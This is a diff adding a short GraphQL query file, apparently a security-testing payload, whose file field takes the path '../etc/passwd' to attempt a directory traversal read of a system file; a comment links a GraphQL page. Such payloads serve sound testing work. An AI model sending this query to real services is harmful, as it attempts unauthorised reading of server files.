@@ -1,0 +1,6 @@
+# https://anmolksachan.github.io/graphql/
+query {
+    file(path: "../etc/passwd") {
+        name
+    }
+}
